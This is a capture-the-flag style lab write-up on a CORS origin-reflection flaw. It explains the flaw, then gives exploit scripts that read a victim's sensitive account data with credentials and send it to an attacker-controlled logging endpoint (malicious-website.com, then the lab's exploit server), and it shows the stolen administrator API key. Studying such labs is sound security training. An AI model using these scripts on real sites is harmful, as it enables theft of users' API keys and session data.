## Overview :

#### Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It then responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an **API key** or **CSRF token**, you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

## Solution :

#### Analysis -

First let's login as wiener using the credentials given - `wiener:peter`


Once logged in , we can see that there is an email update functionality & the **API key of wiener.**

In the HTTP history tab, we can see that the `GET` request to `/accountDetails` contains the **ACAC=true** header in its response.

**This meaans that if we can able to exploit CORS here then we can able to  get the session cookie, API key etc of the user.**

Note that there is no `Origin` header in the request that's why we don't see any `Access-Control-Allow-Origin` header too.

#### Explloiting CORS misconfiguration

If we try to provide `Origin: evil.com` , we can see that there is `Access-Control-Allow-Origin: evil.com` & `Access-Control-Allow-Credentials: true` in the response.

This means the server takes the Origin provided in the request and sends it back in the response with the header `Access-Control-Allow-Origin: true`.

Go to exploit server and paste the following code.

> NOTE - Uri to provide is `/accountDetails`

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0aca000b03408aa480b9856d00e600f5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};
</script>
```

Deliver exploit to Victim & View Access-log, there we can find the API key of administrator.

```json
/log?key={  "username": "administrator",  "email": "",  "apikey": "FTTGVC2HkWwpvvUW54D6cMl9hup8oypH"
```

Finally we've solved the lab.
